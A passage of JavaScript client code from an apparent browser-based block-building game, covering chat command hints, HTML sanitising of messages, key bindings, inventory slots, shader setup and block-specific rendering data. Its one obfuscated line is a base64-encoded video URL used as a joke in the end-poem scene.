					overlay += value.substring(arr[i+2],arr[i+4])
				}
			}*/
			let hintStr = ""
			if(doHints){
				let replaceStart,replaceEnd, replaces
				let lastCmd = this.highlightLastCmd
				this.highlightFullCmds = ""
				if(lastCmd){
					if(lastCmd.stackEndNoSpace){
						replaceStart = lastCmd[lastCmd.length-1].start
						replaceEnd = lastCmd[lastCmd.length-1].end
					}else replaceStart = replaceEnd = lastCmd.nextTokenStart
					
					replaces = value.substring(replaceStart,replaceEnd)
					this.highlightValuesBefore = value.substring(0,replaceStart)//for addhint()
					this.highlightReplaces = replaces
					try{
					this.getCmdNexts(cmds[0],lastCmd,1)
					}catch(e){e.message+="\nhilighting command "+value;throw e}
				}
				
				if(hintObj.prevInput !== value){
					hintObj.prevInput = value
					let idx = hintObj.hints.indexOf(prevHint)
					hintObj.hintIdx = idx === -1 ? 0 : idx
				}
				hintStr += "<span style='color:#aaa;'>"+this.highlightFullCmds+"</span>"
				for(let i=0; i<hintObj.hintsPart.length; i++){
					let h = hintObj.hintsPart[i]
					let b = hintObj.hintIdx === i
					let idx = h.indexOf(replaces)
					if(replaces && idx !== -1) h = h.substring(0,idx)+"<span style='color:white;'>"+h.substring(idx,idx+replaces.length)+"</span>"+h.substring(idx+replaces.length,h.length)
					hintStr += (b ? "<b style='color:yellow;background:#44f;' id='selectedHint'>" : (replaces ? "<span style='color:#aaa;'>" : ""))+h+(b ? "</b>" : (replaces ? "</span>" : ""))+"<br>"
				}
			}
			return {str:hintStr,overlay}
		},
    updateInput(){
      let value = messageInput.value
      if(value.startsWith("/") && world.isMK){
				let {str,overlay} = this.hilightCommand(messageInput,true)
        if(str !== messageHints.innerHTML){
          messageHints.innerHTML = str
					messageHints.classList.remove("hidden")
					messagesAll.classList.add('hidden')
          let s = document.getElementById("selectedHint")
          if(s){
            let rect = s.getBoundingClientRect()
            let rect2 = messages.getBoundingClientRect()
            if(rect.y < rect2.y || rect.y+rect.height > rect2.y+rect2.height) s.scrollIntoView(rect.y < rect2.y)
          }
        }
				messageOverlay.innerHTML = overlay
				messageHolder.classList.add('command')
      }else{
				if(messageInput.prevValue && messageInput.prevValue.startsWith("/")){
					messageHints.classList.add("hidden")
					messagesAll.classList.remove('hidden')
				}
				messageOverlay.innerHTML = sanitize(value)
				messageHolder.classList.remove('command')
			}
      messageInput.prevValue = value
    },
    /*formatGetAttributesInString:function(str){
      var arr = []
      var attribute = "", value = ""
      var inQuotes = false, quoteType = null
      var isValue = false
      for(var l of str){
        if((!inQuotes || l === quoteType) && (l === "'" || l === '"')){
          inQuotes = !inQuotes
          quoteType = l
          if(!inQuotes){
            if(attribute) arr.push([attribute.toLowerCase(),value])
            attribute = value = ""
            isValue = false
            quoteType = null
          }
        }else if(!inQuotes && l === " "){
          if(attribute) arr.push([attribute.toLowerCase(),value.toLowerCase()])
          attribute = value = ""
          isValue = false
          quoteType = null
        }else if(!inQuotes && !(isValue && value) && l === "="){
          isValue = true
        }else{
          if(isValue) value += l
          else attribute += l
        }
      }
      if(attribute) arr.push([attribute.toLowerCase(),value.toLowerCase()])
      return arr
    },
    formatGetElementsInString:function(str){
      var main = []
      var element = {elements:main}
      while(str){
        var isText = true
        if(str[0] === "<"){
          var i = 0
          var j = str.indexOf(">")
          if(j === -1){
            isText = true
          }else if(str[i+1] === "/"){
            var tagName = str.substring(i+2,j).toLowerCase()
            if(tagName === element.tagName){
              element = element.parent
              isText = false
            }
          }else if(!this.formatUnparsedElements.includes(element.tagName)){
            var preclose = (str[j-1] === "/") ? 1 : 0
            var attributeStart = str.indexOf(" ")
            if(attributeStart > j) attributeStart = -1
            var tagEnd = attributeStart === -1 ? j-preclose : attributeStart+i
            attributeStart = attributeStart === -1 ? j-preclose : attributeStart+i+1
            var tagName = str.substring(i+1,tagEnd).toLowerCase()
            var parent = element
            var attributes = this.formatGetAttributesInString(str.substring(attributeStart,j-preclose))
            element = {tagName,attributes,elements:[],parent}
            parent.elements.push(element)
            if(this.formatUnclosedElements.includes(tagName) || preclose){
              element = parent
            }
            isText = false
          }
          if(!isText) str = str.substring(j+1,str.length)
        }
        if(isText){
          var i = str.substring(1,str.length).indexOf("<")
          if(i === -1) i = str.length
          else i++
          let str2 = str.substring(0,i)
          if(!this.formatUnparsedElements.includes(element.tagName)) str2 = str2.replace(/</g,"&lt;").replace(/>/g,"&gt;")
          element.elements.push(str2)
          str = str.substring(i,str.length)
        }
      }
      return main
    },
    formatSafeElements: ["h1","h2","h3","h4","h5","h6","p","img","video","audio","a","ul","ol","li","pre","code","br","b","i","big","center","small","span","strike","strong","sub","sup","table","tbody","td","tfoot","th","thead","tr","hr","button"],
    formatSafeAttributes: ["align","alt","width","height","href","src","media","title","style","target","controls","loop"],
		formatEvalAttributes: ["onclick","onmousemove","onmousedown","onmouseup","onmouseover","onmouseout","onmouseenter","onmouseleave","onmousewheel","onwheel"],
    formatUnclosedElements: ["img","br","hr"],
    formatUnparsedElements: ["pre","code"],
    formatConvertToSafeHtml:function(elements,addTo){
			for(var e of elements){
				if(typeof e === "string"){
					addTo.insertAdjacentHTML("beforeend",e)
					continue
				}else if(e instanceof HTMLElement){
					addTo.appendChild(e)
					continue
				}
				if(!this.formatSafeElements.includes(e.tagName)) e.tagName = "span"
				let element = document.createElement(e.tagName)
				addTo.appendChild(element)
				for(let a of e.attributes){
					if(this.formatEvalAttributes.includes(a[0])){
						try{
							JSON.parse(a[1])
						}catch{continue}
						element.setAttribute(a[0],"safeEval("+a[1]+")")
						continue
					}
					if(!this.formatSafeAttributes.includes(a[0])) continue
					element.setAttribute(a[0],a[1])
				}
				if(this.formatUnclosedElements.includes(e.tagName)) continue
				this.formatConvertToSafeHtml(e.elements,element)
			}
			return addTo
    },*/
		formatAttrcb(name,value,el){
			if(HTMLEvalAttributes.has(name)){
				try{
					JSON.parse(value)
				}catch{
					return
				}
				el.setAttribute(name,"safeEval("+value+")")
				return true
			}
		},
		formatElcb(el){
			for(let n of el.childNodes){
				if(n.nodeType === Node.TEXT_NODE){
					let str = n.textContent.replace(/\n/g,"<br>")
					if(str.includes("")){
		        let arr = str.split("")
		        let res = arr[0], spans = 0
		        for(let i=1; i<arr.length; i++){
		          let s = arr[i], code = s[0]
		          let style
							if(code === "l") style = "font-weight:bold;"
							if(code === "o") style = "font-style:italic;"
							else if(code === "r"){
								style = ""
							  res += "</span>".repeat(spans)
								spans = 0
							}else style = "color:"+colors.css[code]+";"
		          s = s.substring(1)
		          res += "<span style='"+style+"'>"+s
							spans++
		        }
		        res += "</span>".repeat(spans)
		        replaceWithEl.innerHTML = res
      			n.replaceWith(...replaceWithEl.childNodes)
		      }
				}
			}
		},
    format(str){
      //str = this.formatConvertToSafeHtml(this.formatGetElementsInString(str),document.createElement("div")).innerHTML
			str = makeHTMLSafe(str,this.formatAttrcb,this.formatElcb)
      if(userInfo ? userInfo.profanityFilter : true) for(var obj of this.remove){ //remove bad words
        str = str.replace(obj.replace, obj.with)//"<span style='color:red; background:black;'>"+obj.with+"</span>")
      } //if you change this change it at canvas text
      
      return str
    }
  }
  window.Messages = Messages
  window.messagesScroll.onclick = () => canvas.focus()
  //messagesHolder.onmousedown = e => canvas.onmousedown(e) //make buttons work
  messageInput.onkeydown = e => {
		let hintObj = Messages.hints.get(messageInput)
		if(!hintObj) return
    if(e.key === "Tab"){
      if(hintObj.hints.length) messageInput.value = hintObj.hints[hintObj.hintIdx]
      Messages.updateInput()
      e.preventDefault()
    }else if(e.key === "ArrowUp"){
      if(hintObj.hints.length && !e.shiftKey){
        hintObj.hintIdx--
        if(hintObj.hintIdx < 0) hintObj.hintIdx = hintObj.hints.length-1
        Messages.updateInput()
      }else{
        Messages.historyIdx++
        if(Messages.historyIdx >= Messages.history.length) Messages.historyIdx = Messages.history.length-1
				if(Messages.historyIdx in Messages.history){
					messageInput.value = Messages.history[Messages.historyIdx]
					Messages.updateInput()
				}
      }
			e.preventDefault()
    }else if(e.key === "ArrowDown"){
      if(hintObj.hints.length && !e.shiftKey){
        hintObj.hintIdx++
        if(hintObj.hintIdx >= hintObj.hints.length) hintObj.hintIdx = 0
        Messages.updateInput()
      }else{
        Messages.historyIdx--
        if(Messages.historyIdx < -1) Messages.historyIdx = -1
				if(Messages.historyIdx in Messages.history){
					messageInput.value = Messages.history[Messages.historyIdx]
					Messages.updateInput()
				}else if(Messages.historyIdx === -1){
					messageInput.value = ""
					Messages.updateInput()
				}
      }
			e.preventDefault()
    }else Messages.historyIdx = -1
  }
  messageInput.onkeyup = e => {
    if(e.key === "Enter") {
      Messages.submitInput()
    }else if (e.key === "Escape") {
			play()
		}
  }
  messageInput.oninput = () => {
    Messages.updateInput()
  }
	messageInput.onscroll = () => messageOverlay.scrollLeft = messageInput.scrollLeft
  window.addEventListener("blur", () => Messages.onblur())
  window.addEventListener("focus", () => Messages.onfocus())
  
  let title = ""
  let subtitle = ""
  let titleFadeIn = 0 //duration in miliseconds
  let titleFadeOut = 0
  let titleStay = 0
  let titleColor = "black"
  let titleStart = 0
  let titleShowing = false
  function showTitle(Title, Subtitle, color, fadeIn = 500,fadeOut = 2000,stay = 1000){
    titleStart = Date.now()
    title = Title
    subtitle = Subtitle
    titleColor = color || "white"
    titleFadeIn = fadeIn
    titleFadeOut = fadeOut
    titleStay = stay
    titleShowing = true
  }
  win.showTitle = showTitle
	let sideMessages = []
  function sideMessage(title, content = ""){
		sideMessages.push({time:600,title,content})
  }
  win.sideMessage = sideMessage
  function customMenu(html){
    customMenuClose.onclick = () => play()
    customMenuEl.innerHTML = Messages.format(html)
    changeScene("custom menu")
    releasePointer()
  }
  win.customMenu = customMenu
  function die(){
    if(screen === "dead" || screen === "temporary dead" || screen === "loading" || screen === "netherLoading" || screen === "endLoading") return
    /*hitSound()
    calculateTotalXP()
    if(p.survival && p.dimension !== "end"){
      for(var i=0; i<inventory.hotbar.length; i++){
        if(inventory.hotbar[i]){
          world.addItems(p.x,p.y,p.z,p.dimension,0,0,0,inventory.hotbar[i].id,true, inventory.hotbar[i].amount,inventory.hotbar[i].durability,inventory.hotbar[i].customName,p.id)
          inventory.hotbar[i] = 0
        }
      }
      for(var i=0; i<invLength; i++){
        if(invItems[i]){
          world.addItems(p.x,p.y,p.z,p.dimension,0,0,0,invItems[i].id, true, 1,invItems[i].durability,invItems[i].customName,p.id)
          invItems[i] = 0
        }
      }
      holding = 0
      if(p.totalXP > 0) world.addEntity(new entities[entityIds.ExperienceOrb](p.x,p.y,p.z,p.totalXP),false,p.dimension)
    }*/
    lastDeathTime = now
    p.bodyRot = p.ry
		p.die = true
		//Messages.add("6"+dieMessage)
    //send({type:"die", id:p.id, message:dieMessage})
    //if(p.dimension === "end" && !cheats && p.gameMode !== "hardcore") changeScene("temporary dead")
		//else
		changeScene("dead")
    releasePointer()
  }
  /*function damage(amount, why, nosound,type, x,y,z){
		let h = inventory.hotbar[inventory.hotbarSlot]
		if(h && h.id && p.usingItem && blockData[h.id].sword){
			amount /= blockData[h.id].durability/30
			h.durability -= amount/5
		}

    let prev = amount
    if(harmEffect > 0){
      //when your red, you are immune to most damage
      if(amount > p.lastDamage){
        amount -= p.lastDamage
      }else return
    }else p.lastDamageHealth = p.health
    
    p.health -= amount
    harmEffect = 30
    p.lastDamage = prev

		if(x || x === 0 || y || y === 0 || z || z === 0){
			x -= p.x, y -= p.y, z -= p.z
			damageX = x
			damageY = y
			damageZ = z
		}else{
			damageX = damageY = damageZ = 0
		}
    
    if(!nosound){
      switch(type){
        case "drown":
          drownHurtSound()
          break
        case "freeze":
          freezeHurtSound()
          break
        case "fire":
          fireHurtSound()
          break
        case "berrybush":
          berrybushHurtSound()
          break
        case "smallfall":
          playSound("damage.smallfall")
          break
        case "bigfall":
          playSound("damage.bigfall")
          break
				case "hit":
					oofSound() //also do below
        default:
          hitSound()
          break
      }
    }
    loseHealthEffect = 40
    dieMessage = why
    updateHUD = true
    send({type:"harmEffect"})
  }*/
	let Key = {}
	let modelView = win.modelView || new Float32Array(16)
	win.modelView = modelView
	let glCache
	let worlds = {}, selectedWorld = 0
	let freezeFrame = 0
	let p
	let vec1 = new PVector(), vec2 = new PVector(), vec3 = new PVector(), vec4 = new PVector()
	let move = {
		x: 0,
		y: 0,
		z: 0,
		ang: Math.sqrt(0.5),
	}
	let p2 = {
		x: 0,
		y: 0,
		z: 0,
	}
  let p3 = { //precise positions for multiplayer
    x: 0,
    y: 0,
    z: 0,
    survival: false,
    username: "",
    hidden: false,
		dimension:"",
		crackPos: hitBox.pos,
		holding:0
  }
  let controlMap = {}, controlKeys = {}
  function setControl(name, key, Name, isGameControl = null, shift = false, ctrl = false, alt = false){
    if(controlMap[name]){
      var c = controlMap[name]
			delete controlKeys[c.key]
			controlKeys[key] = c
      c.key = key
      c.shift = shift
      c.ctrl = ctrl
      c.alt = alt
    }else{
      controlMap[name] = {
        key,
        default:key,
        name,
        Name,
				isGameControl,
        shift,
        ctrl,
        alt,
        get pressed() {
          return Boolean(Key[this.key]
            && (!this.shift || Key.ShiftLeft || Key.ShiftRight)
            && (!this.ctrl || Key.ControlLeft || Key.ControlRight)
            && (!this.alt || Key.AltLeft || Key.AltRight))
        },
        // Check to see if all of an event's data matches this key map
        event(e) {
          return Boolean(e.key === this.key
            && (!this.shift || e.shiftKey)
            && (!this.ctrl || e.ctrlKey)
            && (!this.alt || e.altKey))
        }
      }
			controlKeys[key] = controlMap[name]
    	defaultSettings["control_"+name] = key
    }
    settings["control_"+name] = key
  }
  win.setControl = setControl
  setControl("jump", " ", "Jump / Fly up",true)
  setControl("forward", "w", "Walk forward",true)
  setControl("left", "a", "Strafe keft",true)
  setControl("backward", "s", "Walk backwards",true)
  setControl("right", "d", "Strafe right",true)
  setControl("sprint", "q", "Sprint",true)
  setControl("inventory", "e", "Open inventory")
  setControl("chat", "t", "Open chat")
  setControl("command", "/", "Type command")
  setControl("pause", "p", "Pause")
  setControl("hyperBuilder", "h", "Toggle Hyper Builder",true)
  setControl("superBreaker", "b", "Toggle Super Breaker",true)
  setControl("spectator", "l", "Toggle spectator mode")
  setControl("zoom", "z", "Zoom in",true)
  setControl("cycleBlockShapes", "enter", "Cycle block shapes",true)
  setControl("sneak", "shift", "Sneak / Fly down",true)
  setControl("dropItem", "backspace", "Drop item",true)
  setControl("break", "leftMouse", "Attack / Destroy",true)
  setControl("place", "rightMouse", "Use item / Place block",true)
  setControl("pick", "middleMouse", "Pick block",true)
  setControl("toggleView", "o", "Toggle view")
  setControl("sit", "u", "Toggle sitting",true)
  function resetControls(){
    for(var i in controlMap){
      var c = controlMap[i]
      setControl(c.name, c.default)
    }
    updateControls()
  }
  var controlsAreDefault
  function updateControls(){
    var el = window.controls
    while (el.firstChild) {
			el.removeChild(el.firstChild)
		}
    var table = document.createElement("table")
    controlsAreDefault = true
    for(var i in controlMap){
      var c = controlMap[i]
      var row = document.createElement("tr")
      row.id = "control:"+i
      row.classList.add("control")
      var td = document.createElement("td")
      td.innerHTML = language && language.texts["control."+c.name] || c.Name
      row.appendChild(td)
      var td = document.createElement("td")
      td.innerHTML = "<button title='Click to change key' onclick='changeKey(\""+i+"\")'>"+c.key+"</button>"
      row.appendChild(td)
      var td = document.createElement("td")
      td.innerHTML = "<button onclick='resetKey(\""+i+"\")' "+(c.key === c.default ? "disabled" : "")+">Reset</button>"
      row.appendChild(td)
      table.appendChild(row)
      if(c.key !== c.default) controlsAreDefault = false
    }
    el.appendChild(table)
  }
  win.changeKey = function(c){
    c = controlMap[c]
    function detected(key){
      setControl(c.name, key)
      controlDetect.classList.add("hidden")
      controlDetect.onmouseup = null
      controlDetect.onkeyup = null
      updateControls()
      controlDetect.blur()
    }
    controlDetect.classList.remove("hidden")
    controlDetect.focus()
    controlDetect.onmouseup = function(e){
      switch(e.button) {
        case 0:
          detected("leftMouse")
          break
        case 1:
          detected("middleMouse")
          break
        case 2:
          detected("rightMouse")
          break
      }
    }
    controlDetect.onkeyup = function(e){
      detected(e.key.toLowerCase())
    }
  }
  win.resetKey = function(key){
    var c = controlMap[key]
    setControl(c.name, c.default)
    updateControls()
  }
  function loadControls(){
    for(let i in settings){
			if(!i.startsWith("control_")) continue
      setControl(i.replace("control_",""), settings[i])
    }
    updateControls()
  }
	let place
  let liquid = false
  let powder = false
  let spikyBush = false
  let quicksand = false
  let inLiquid = 0, prevInLiquid = 0 //camera is in liquid
  let waterFogColor = [1,1,1]
  let wet = false
	let disableLighting = false
  let blockHere = 0
  let blockHereEntity = new Array(8)
  let tick = false, lastTick = 0, now = performance.now()
  let flicker = false
  let lastLiquid = false
  let attackCooldown = 0, attackCooldownStart = 0, attackCooldownTime = 0 //for swords
  let harmEffect = 0
	let damageX = 0, damageY = 0, damageZ = 0
  let healEffect = 0 // health bar outline flash white
  let lastHeal = 0
  let lastBlockHarm = 0
  let lastLoseOxygen = 0
  let lastGetOxygen = 0
  let lastDeathTime = 0
	let waitingRespawn = false
  let deadButtonsDisabled = false
  let freezeEffect = 0
  let lastFreezeHealth = 0
  let loseHealthEffect = 0
  let portalEffect = 0
  let portalFadeOutEffect = 0
  let portalTriggerSound = null
  let portalTriggerSoundGain = null
	let fromEndPortal = false
  let touchingPortal = false
  function portalTriggerSoundStart(source, gainNode){
    portalTriggerSound = source
    portalTriggerSoundGain = gainNode
  }
  let lastStepSound = 0
  let viewBobIntensity = 0, prevViewBobIntensity = 0, prevViewBob = false, viewBobCount = 0, lastViewBobCount = 0
  let eatSoundTimer = 0
  let doEndPoem = false, didEndPoem = false
	function showEndPoem(){
		doEndPoem = true
		changeScene("endPoem")
		releasePointer()
		endPoemVideo.classList.remove("hidden")
		endPoemVideo.currentTime = 0
		endPoemVideo.onended = () => {
			doEndPoem = false
			endPoemVideo.classList.add("hidden")
			endPoemVideo.pause()
		}
		endPoemVideo.src = atob("aHR0cHM6Ly9pYTgwMTYwMi51cy5hcmNoaXZlLm9yZy8xMS9pdGVtcy9SaWNrX0FzdGxleV9OZXZlcl9Hb25uYV9HaXZlX1lvdV9VcC9SaWNrX0FzdGxleV9OZXZlcl9Hb25uYV9HaXZlX1lvdV9VcC5tcDQ=")
		endPoemVideo.play()
	}
	let hostileMobNearbyTimer = 0
	let inventory = {
		//hotbar: [0,0,0,0,0,0,0,0,0],
		hotbarSlot: 0,
    showName:0,
		size: 40 * min(width, height) / 600,
    ts:(40 * min(width, height) / 600) / 16,
		holding: 0,
    //space: invItems,
    //crafting: [0,0,0,0,0,0,0,0,0],
    //craftingRes: 0, //block id
    //anvilInput:0,
    //anvilMaterial:0,
    //anvilOutput:0,
    //anvilCost:0,
    spreaded: [],
    //spreadPlace: "", //inventory, crafting, etc
    spreadStart: -1,
    //spreading: false,
		spreadItem:null,
    containerData: {
      x:0,y:0,z:0,dimension:"",
      data:null
    },
    category:0,
		slotIds:{
			hotbar:[],
			main:[],
			crafting3:[],
			crafting2:[],
			craftingResult:null,
			furnaceInput:null,
			furnaceOutput:null,
			furnaceFuel:null,
			chest:[],
			anvilInput:null,
			anvilMaterial:null,
			anvilOutput:null,
			dispenser:[],
			hopper:[]
		},
		slots:[],
		currentContainer:null,
		slotPos:[]
	}
	let {containerData} = inventory
	function orderInvSlots(){
		let id = 0
		let currentContainer = screen
		inventory.slotIds.holding = id++
		if(screen === "inventory"){
			for(let i=0; i<4; i++) inventory.slotIds.crafting2[i] = id++
			inventory.slotIds.craftingResult = id++
		}else if(screen === "crafting"){
			for(let i=0; i<9; i++) inventory.slotIds.crafting3[i] = id++
			inventory.slotIds.craftingResult = id++
		}else if(screen === "furnace"){
			inventory.slotIds.furnaceInput = id++
			inventory.slotIds.furnaceOutput = id++
			inventory.slotIds.furnaceFuel = id++
		}else if(screen === "chest"){
			for(let i=0; i<27; i++) inventory.slotIds.chest[i] = id++
		}else if(screen === "anvil"){
			inventory.slotIds.anvilInput = id++
			inventory.slotIds.anvilMaterial = id++
			inventory.slotIds.anvilOutput = id++
		}else if(screen === "dispenser"){
			for(let i=0; i<9; i++) inventory.slotIds.dispenser[i] = id++
		}else if(screen === "hopper"){
			for(let i=0; i<5; i++) inventory.slotIds.hopper[i] = id++
		}else if(screen === "commandBlock"){
		}else if(screen === "edit sign"){
			currentContainer = "sign"
		}else currentContainer = "hotbar"
		for(let i=0; i<27; i++) inventory.slotIds.main[i] = id++
		for(let i=0; i<9; i++) inventory.slotIds.hotbar[i] = id++
		if(inventory.currentContainer === currentContainer) return
		inventory.currentContainer = currentContainer
		inventory.slots.length = id
		inventory.slots.fill(null)
		inventory.spreadStart = -1
		if(inventory.spreaded.length) inventory.spreaded = []
		inventory.spreadItem = null
		send({type:"openContainer",data:currentContainer,x:containerData.x,y:containerData.y,z:containerData.z,dimension:containerData.dimension})
	}
	function updateHUDIcons(){
		let s = inventory.size
		let y = height - s * 1.5 + 0.5
		let iw = inventory.iw = s/2.25
		let xpbh = inventory.xpbh = s*9/182*5 //xp bar height
		let pw = inventory.pw = iw/9 //pixel width
		let pw2 = inventory.pw2 = pw/2
		let iw2 = inventory.iw2 = iw/2
		let dw = inventory.dw = iw2 - pw2
		let aw = inventory.aw = iw - pw //adjusted width
		let iy = inventory.iy = y-iw-(pw*4)-xpbh
		let ih = inventory.ih = iw + pw
		let maxX = inventory.maxX = (width / 2) + (9 / 2 * s) + 25
		inventory.ss2 = min(width,height)/700
		inventory.ss = min(width,height)/lerp(max(min((min(width,height)-300)/300,1),0),400,700)
		let g = inventory.tempGrad = ctx.createLinearGradient(maxX-iw*10.5,0,maxX-iw*0.5,0)
		g.addColorStop(1, "#f40")
		g.addColorStop(0.5, "white")
		g.addColorStop(0, "#44f")
	}
	updateHUDIcons()
  win.inventory = inventory
	//}
  /*function setHotbar(arr){
    for(var i=0; i<9; i++){
      inventory.hotbar[i] = arr[i] && {id:arr[i],amount:64}
    }
  }*/
	function getSignSide(tags){
		let ry = p.ry*16/Math.PId
		let diff = tags.rot - ry
		if(diff < 0) diff += 16
		if(diff >= 16) diff -= 16
		return diff>4 && diff<12
	}
  function editSign(x,y,z,dimension){
		let tags = world.getTags(x,y,z,dimension)
		if(!tags) return
    containerData.x = x
    containerData.y = y
    containerData.z = z
    containerData.dimension = dimension
		containerData.side = getSignSide(tags)
    editSignBox.focus()
    changeScene("edit sign")
    releasePointer()
  }
  
  let allSleeping = true, sleepCount, sleepTotal

	function play() {
		canvas.onblur()
		p.lastBreak = Date.now()
		updateHUD = true
		use3d()
		gl.clearColor(sky[0], sky[1], sky[2], 1.0)
		getPointer()
		fill(255, 255, 255)
		textSize(10)
    canvas.focus()
		changeScene("play")
    if(!p.survival) inventory.category = "search"
		lastBlur = null
		orderInvSlots()
	}

	let gl
	let glExtensions
	function getPointer() {
    if(touchScreen) return
		if (canvas.requestPointerLock) {
			let p = canvas.requestPointerLock()
			if(p) p.catch(console.error)
		}
	}
	function releasePointer() {
		if (doc.exitPointerLock) {
			doc.exitPointerLock()
		}
	}

	let Block = {
		bottom: 0x4,
		top: 0x8,
		north: 0x20,
		south: 0x10,
		east: 0x2,
		west: 0x1,
	}
	let Sides = {
		bottom: 0,
		top: 1,
		north: 2,
		south: 3,
		east: 4,
		west: 5,
	}
	let blockSides = Object.keys(Block)

	function createProgramObject(curContext, vetexShaderSource, fragmentShaderSource) {
		let vertexShaderObject = curContext.createShader(curContext.VERTEX_SHADER)
		curContext.shaderSource(vertexShaderObject, vetexShaderSource)
		curContext.compileShader(vertexShaderObject)
		if (!curContext.getShaderParameter(vertexShaderObject, curContext.COMPILE_STATUS)) {
			throw curContext.getShaderInfoLog(vertexShaderObject)
		}

		let fragmentShaderObject = curContext.createShader(curContext.FRAGMENT_SHADER)
		curContext.shaderSource(fragmentShaderObject, fragmentShaderSource)
		curContext.compileShader(fragmentShaderObject)
		if (!curContext.getShaderParameter(fragmentShaderObject, curContext.COMPILE_STATUS)) {
			throw curContext.getShaderInfoLog(fragmentShaderObject)
		}

		let programObject = curContext.createProgram()
		curContext.attachShader(programObject, vertexShaderObject)
		curContext.attachShader(programObject, fragmentShaderObject)
		curContext.linkProgram(programObject)
		if (!curContext.getProgramParameter(programObject, curContext.LINK_STATUS)) {
			throw new Error("Error linking shaders. "+curContext.getProgramInfoLog(programObject))
		}

		return programObject
	}
	function createProgram(name, constants = {}){
		if(settings.graphics === "morereal") constants.GRAPHICS_MORE_REAL = ""
		let constStr = ""
		for(let i in constants){
			constStr += "#define "+i+" "+constants[i]+"\n"
		}
		return createProgramObject(gl,
			constStr+document.getElementById(name+"VertexShader").text.replace(/#minekhan_import ([^\s]*)/g,function($0,$1){
				return document.getElementById($1+"Vertex").text
			}),
			constStr+document.getElementById(name+"FragmentShader").text.replace(/#minekhan_import ([^\s]*)/g,function($0,$1){
				return document.getElementById($1+"Fragment").text
			})//.replace(/\$\{([^\}]*)\}/g, ($0,$1) => constants[$1])
		)
	}

	let program3D, program2D, skyboxProgram, programEntity, programParticle, programText, programWeather, programAvgBrightness, programShadowMap

	let {shapes} = win

	function compareArr(arr, out) {
		let minX = 1000
		let maxX = -1000
		let minY = 1000
		let maxY = -1000
		let minZ = 1000
		let maxZ = -1000
		let num = 0
		for (let i = 0; i < arr.length; i += 3) {
			num = arr[i]
			minX = minX > num ? num : minX
			maxX = maxX < num ? num : maxX
			num = arr[i + 1]
			minY = minY > num ? num : minY
			maxY = maxY < num ? num : maxY
			num = arr[i + 2]
			minZ = minZ > num ? num : minZ
			maxZ = maxZ < num ? num : maxZ
		}
		out[0] = minX
		out[1] = minY
		out[2] = minZ
		out[3] = maxX
		out[4] = maxY
		out[5] = maxZ
		return out
	}
  function arrayValuesEqual(a1,a2){
    if(a1.length !== a2.length) return false
    let minLen = a1.length
    for(var i=0; i<minLen; i++){
      if(a1[i] !== a2[i]){
        return false
      }
    }
    return true
  }

	function initBlockEntities(){
		crack.entity = new crackEntity("crack1",0,0,0)
    for(var i=0; i<crack.length; i++) crack.entity.cacheTexture(crack[i])
    entityFire = new EntityFire()
		for(let i=0; i<blockHereEntity.length; i++) blockHereEntity[i] = new BlockEntity(0,0,0,0)
	}
	let blockData, blockIds, BLOCK_COUNT, blockInfoIds, inventoryBlocks
	let mkBlockData = window.blockData, mkBlockIds = window.blockIds, mkBlockCount, mkBlockInfoIds, mkInventoryBlocks
	function initBlockData() {
		if(mkBlockCount){
			blockData = mkBlockData
			blockIds = mkBlockIds
			BLOCK_COUNT = mkBlockCount
			blockInfoIds = mkBlockInfoIds
			inventoryBlocks = mkInventoryBlocks
			return
		}
		win.initServerBlockData()
const blockDataAdditional = {
	grass:{
		/*customTexture:function(x,y,z,dimension,block,side){
			if(block !== this.id || side === "bottom" || side === "top") return //Skip snow variant
			if(side === "north" && world.getBlock(x,y-1,z+1,dimension) !== this.id) return
			if(side === "south" && world.getBlock(x,y-1,z-1,dimension) !== this.id) return
			if(side === "east" && world.getBlock(x+1,y-1,z,dimension) !== this.id) return
			if(side === "west" && world.getBlock(x-1,y-1,z,dimension) !== this.id) return
			return "grassSideGrass"
		}*/
	},
	redstoneDust:{
		clientTick:function(block,x,y,z,dimension,world){
			if(!performFast && world.getPower(x,y,z,dimension)) world.addParticle(new entities[entityIds.RedstoneParticle](x,y-0.49,z,null,(block&FLIP)===FLIP),dimension)
		},
		alwaysCustomTexture:true,
		customTexture:function(x,y,z,dimension,block,side,originalShapeVerts,tags){
			const up = getTagBits(tags,"up",this.id), down = getTagBits(tags,"down",this.id)
			if(originalShapeVerts.t) side = originalShapeVerts.t
			else return (side === "top" || side === "bottom") && up && down && false
			let tex
			if(side === "west") tex = tags && (getTagBits(tags,"westUp",this.id) || up)
			else if(side === "east") tex = tags && (getTagBits(tags,"eastUp",this.id) || up)
			else if(side === "south") tex = tags && (getTagBits(tags,"northUp",this.id) || up)
			else if(side === "north") tex = tags && (getTagBits(tags,"southUp",this.id) || up)
			return tex ? "redstoneDustLine" : false
		}
	},
	torch:{
		clientTick:function(block,x,y,z,dimension){
			if(performFast) return
			let wall = this.id | SLAB
			let pix = 1/16
			switch(block){
				case wall | NORTH:
					z += pix*5
					y += pix*6
					break
				case wall | SOUTH:
					z -= pix*5
					y += pix*6
					break
				case wall | EAST:
					x += pix*5
					y += pix*6
					break
				case wall | WEST:
					x -= pix*5
					y += pix*6
					break
				default:
					y += pix*2
			}
			world.addParticle(new entities[entityIds.FlameParticle](x,y,z),dimension)
		},
	},
	soulTorch:{
		 clientTick:function(block,x,y,z,dimension){
			if(performFast) return
			let wall = this.id | SLAB
			let pix = 1/16
			switch(block){
				case wall | NORTH:
					z += pix*5
					y += pix*6
					break
				case wall | SOUTH:
					z -= pix*5
					y += pix*6
					break
				case wall | EAST:
					x += pix*5
					y += pix*6
					break
				case wall | WEST:
					x -= pix*5
					y += pix*6
					break
				default:
					y += pix*2
			}
			world.addParticle(new entities[entityIds.FlameParticle](x,y,z,"soul"),dimension)
		},
	},
	sandstone:{
		customTexture:function(x,y,z,dimension,block,side){
			if(world.getBlock(x,y+1,z,dimension) === block) return "sandstoneBottom"
		},
	},
	redSandstone:{
		customTexture:function(x,y,z,dimension,block,side){
			if(world.getBlock(x,y+1,z,dimension) === block) return "redSandstoneBottom"
		}
	},
	dropper:{
		upTextures:fillTextureArray(["furnaceTop","dropperFrontVertical","furnaceTop"]),
		downTextures:fillTextureArray(["dropperFrontVertical","furnaceTop","furnaceTop"]),
		onclientclick:function(x,y,z,dimension){
			containerData.x = x
			containerData.y = y
			containerData.z = z
			containerData.dimension = dimension
			changeScene("dispenser")
			releasePointer()
		},
	},
	dispenser:{
		upTextures:fillTextureArray(["furnaceTop","dispenserFrontVertical","furnaceTop"]),
		downTextures:fillTextureArray(["dispenserFrontVertical","furnaceTop","furnaceTop"]),
		onclientclick:function(x,y,z,dimension){
			containerData.x = x
			containerData.y = y
			containerData.z = z
